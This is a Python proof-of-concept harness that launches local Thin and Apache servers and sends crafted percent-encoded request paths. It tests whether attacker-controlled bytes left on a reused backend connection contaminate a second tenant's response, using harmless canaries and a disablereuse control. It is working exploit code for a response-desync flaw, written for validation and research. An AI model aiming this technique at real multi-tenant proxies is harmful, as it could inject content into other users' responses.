#!/usr/bin/env python3
"""Validated Rack/Thin -> Apache contamination classifier.

This test intentionally distinguishes attacker-byte provenance from generic
victim response corruption. It does not treat an unequal body, a 4xx/5xx,
or a timeout as contamination.
"""

from __future__ import annotations

import argparse
import json
import os
import socket
import subprocess
import tempfile
import time
from pathlib import Path


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 8.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(8192)
        if not chunk:
            break
        data += chunk
    return data


def parse_response(sock: socket.socket) -> dict[str, object]:
    data = recv_until(sock, b"\r\n\r\n")
    if b"\r\n\r\n" not in data:
        return {"kind": "incomplete_headers", "raw": data}
    raw_headers, body = data.split(b"\r\n\r\n", 1)
    lines = raw_headers.split(b"\r\n")
    status = int(lines[0].split(b" ", 2)[1]) if len(lines[0].split()) >= 2 else 0
    headers: dict[str, str] = {}
    for line in lines[1:]:
        if b":" in line:
            key, value = line.split(b":", 1)
            headers[key.decode("latin1").lower()] = value.strip().decode("latin1")
    if "content-length" not in headers:
        return {"kind": "no_content_length", "status": status,
                "headers": headers, "raw": raw_headers}
    length = int(headers["content-length"])
    while len(body) < length:
        try:
            chunk = sock.recv(8192)
        except (OSError, socket.timeout):
            return {"kind": "truncated_body", "status": status,
                    "headers": headers, "declared": length,
                    "received": len(body), "body": body}
        if not chunk:
            return {"kind": "truncated_body", "status": status,
                    "headers": headers, "declared": length,
                    "received": len(body), "body": body}
        body += chunk
    return {"kind": "complete", "status": status, "headers": headers,
            "declared": length, "body": body[:length],
            "prefetched_extra": body[length:]}


def wait_for_port(port: int, proc: subprocess.Popen[str], label: str,
                  log_path: Path) -> None:
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            raise RuntimeError(f"{label} exited: {log_path.read_text()!r}")
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return
        except OSError:
            time.sleep(0.1)
    raise TimeoutError(f"{label} did not listen on {port}")


def make_body_path(canary: bytes) -> str:
    # The declared character count places the delayed tail at the second byte
    # of the UTF-8 snowman, matching the previously observed 98 83 boundary.
    before = 40
    after = 2 * before - len(canary) - 1
    if after <= 0:
        raise AssertionError("canary is too long for the alignment")
    return ("/missing/" + "%E2%98%83" * before + "%E2%98%83" +
            "".join(f"%{byte:02X}" for byte in canary) +
            "%E2%98%83" * after)


def request(port: int, path: str, rid: str, host: str,
            collect_extra: bool = False) -> dict[str, object]:
    with socket.create_connection(("127.0.0.1", port), timeout=8) as sock:
        sock.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                      f"X-Probe-ID: {rid}\r\n"
                      "Connection: keep-alive\r\n\r\n").encode())
        # Deliberately stop at the declared response body. Closing this client
        # socket leaves the backend tail available to Apache's pool, matching
        # the baseline experiment.
        result = parse_response(sock)
        if collect_extra and result.get("kind") == "complete":
            extra = result.get("prefetched_extra", b"")
            assert isinstance(extra, bytes)
            sock.settimeout(3)
            while True:
                try:
                    chunk = sock.recv(8192)
                except socket.timeout:
                    break
                if not chunk:
                    break
                extra += chunk
            result["prefetched_extra"] = extra
        return result


def start_apache(httpd: Path, server_root: Path, root: Path,
                 disablereuse: bool) -> subprocess.Popen[str]:
    reuse = " disablereuse=On" if disablereuse else ""
    config = root / "httpd.conf"
    config.write_text(f"""\
ServerRoot \"{server_root}\"
Listen 127.0.0.1:18080
PidFile \"{root / 'httpd.pid'}\"
ErrorLog \"{root / 'error.log'}\"
LogLevel proxy:trace5 proxy_http:trace5
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
LogFormat \"rid=%{{X-Probe-ID}}i host=%{{Host}}i peer=%{{proxy-source-port}}n status=%>s bytes=%B\" probe
CustomLog \"{root / 'access.log'}\" probe
ProxyPass / http://127.0.0.1:18181/ retry=0{reuse}
ProxyPassReverse / http://127.0.0.1:18181/
""")
    proc = subprocess.Popen(
        [str(httpd), "-f", str(config), "-DFOREGROUND"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        env={**os.environ, "APACHE_RUN_DIR": str(root)},
    )
    wait_for_port(18080, proc, "Apache", root / "error.log")
    return proc


def classify_victim(result: dict[str, object], rid: str,
                    canary_prefix: bytes, expected: bytes) -> str:
    if result.get("kind") != "complete":
        return str(result.get("kind", "unknown_error"))
    if result.get("status") != 200:
        return "victim_status_mismatch"
    headers = result["headers"]
    assert isinstance(headers, dict)
    if headers.get("x-probe-id") != rid:
        return "victim_request_id_mismatch"
    body = result["body"]
    assert isinstance(body, bytes)
    if canary_prefix in body:
        return "attacker_bytes_in_victim_body"
    if body == expected:
        return "clean_victim_response"
    return "unknown_body_mismatch"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--thin", required=True, type=Path)
    parser.add_argument("--fixture", required=True, type=Path)
    parser.add_argument("--iterations", type=int, default=100)
    parser.add_argument("--disablereuse", action="store_true")
    args = parser.parse_args()

    expected_victim = b"VICTIM-OWN"
    with tempfile.TemporaryDirectory(prefix="rack-thin-validation-") as tmp:
        root = Path(tmp)
        rack_root = root / "files"
        rack_root.mkdir()
        request_log = root / "rack-requests.log"
        thin_log = root / "thin.log"
        thin = subprocess.Popen(
            [str(args.thin), "start", "-R", str(args.fixture / "config.ru"),
             "-a", "127.0.0.1", "-p", "18181"],
            cwd=args.fixture, stdout=thin_log.open("w"), stderr=subprocess.STDOUT,
            text=True, env={**os.environ, "RACK_FILES_ROOT": str(rack_root),
                            "RACK_THIN_REQUEST_LOG": str(request_log)},
        )
        proxy = None
        try:
            wait_for_port(18181, thin, "Thin", thin_log)
            first_canary = b"A0000_CANARY"
            first_path = make_body_path(first_canary)
            direct = request(18181, first_path, "direct-0000",
                             "tenant-a.example", collect_extra=True)
            print("direct=" + json.dumps({
                "kind": direct.get("kind"), "status": direct.get("status"),
                "declared": direct.get("declared"),
                "body_len": len(direct.get("body", b"")),
                "extra_prefix": direct.get("prefetched_extra", b"")[:32].hex(),
            }))
            direct_extra = direct.get("prefetched_extra", b"")
            if not isinstance(direct_extra, bytes) or not direct_extra.startswith(b"\x98\x83A0000_CANARY"):
                raise AssertionError("direct backend did not produce the expected canary prefix")

            proxy = start_apache(args.httpd, args.server_root, root,
                                 args.disablereuse)
            counts: dict[str, int] = {}
            samples: dict[str, object] = {}
            for i in range(args.iterations):
                rid = f"probe-{i:04d}"
                marker = f"A{i:04d}_CANARY".encode()
                path = make_body_path(marker)
                attack = request(18080, path, rid, "tenant-a.example")
                if attack.get("kind") != "complete":
                    category = "attack_" + str(attack.get("kind", "error"))
                    counts[category] = counts.get(category, 0) + 1
                    continue
                victim_rid = rid + "-victim"
                victim = request(18080, "/victim", victim_rid,
                                 "tenant-b.example")
                category = classify_victim(
                    victim, victim_rid, b"\x98\x83" + marker[:8],
                    expected_victim,
                )
                counts[category] = counts.get(category, 0) + 1
                samples.setdefault(category, {
                    "attack": attack,
                    "victim": victim,
                })

            print("classification=" + json.dumps(counts, sort_keys=True))
            print("samples=" + json.dumps({
                key: {
                    "victim_kind": value["victim"].get("kind"),
                    "victim_status": value["victim"].get("status"),
                    "victim_headers": value["victim"].get("headers"),
                    "victim_body_hex": value["victim"].get("body", b"").hex(),
                } for key, value in samples.items()
            }, sort_keys=True))
            if request_log.exists():
                backend_text = request_log.read_text()
                print("backend_requests=" + backend_text)
            if (root / "access.log").exists():
                access_text = (root / "access.log").read_text()
                print("apache_access_log=" + access_text)
                # Apache mod_proxy_http records the local source port used
                # for the backend connection in proxy-source-port.  Thin's
                # Rack env did not expose a reliable REMOTE_PORT in the
                # previous classifier, so do not infer socket reuse from the
                # fixture's peer field.
                access_records: dict[str, dict[str, str]] = {}
                for line in access_text.splitlines():
                    fields = dict(item.split("=", 1) for item in line.split()
                                  if "=" in item)
                    if fields.get("rid"):
                        access_records[fields["rid"]] = fields
                same_peer = 0
                peer_pairs = 0
                for i in range(args.iterations):
                    a = access_records.get(f"probe-{i:04d}")
                    b = access_records.get(f"probe-{i:04d}-victim")
                    if a and b and a.get("peer") and b.get("peer"):
                        peer_pairs += 1
                        same_peer += int(a["peer"] == b["peer"])
                print("apache_backend_correlation=" + json.dumps({
                    "pairs": peer_pairs,
                    "same_backend_source_port": same_peer,
                }, sort_keys=True))
            if (root / "error.log").exists():
                trace = (root / "error.log").read_text()
                print("apache_trace_tail=" + trace[-12000:])
            mode = "disabled" if args.disablereuse else "enabled"
            print(f"reuse_mode={mode}")
            if args.disablereuse:
                control_categories = set(counts)
                control_pass = bool(control_categories) and control_categories == {
                    "clean_victim_response"
                }
            else:
                control_pass = bool(counts.get("attacker_bytes_in_victim_body", 0))
            print("result=" + ("PASS" if control_pass else "INCONCLUSIVE"))
            return 0
        finally:
            if proxy is not None:
                proxy.terminate()
                try:
                    proxy.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proxy.kill()
            thin.terminate()
            try:
                thin.wait(timeout=3)
            except subprocess.TimeoutExpired:
                thin.kill()


if __name__ == "__main__":
    raise SystemExit(main())
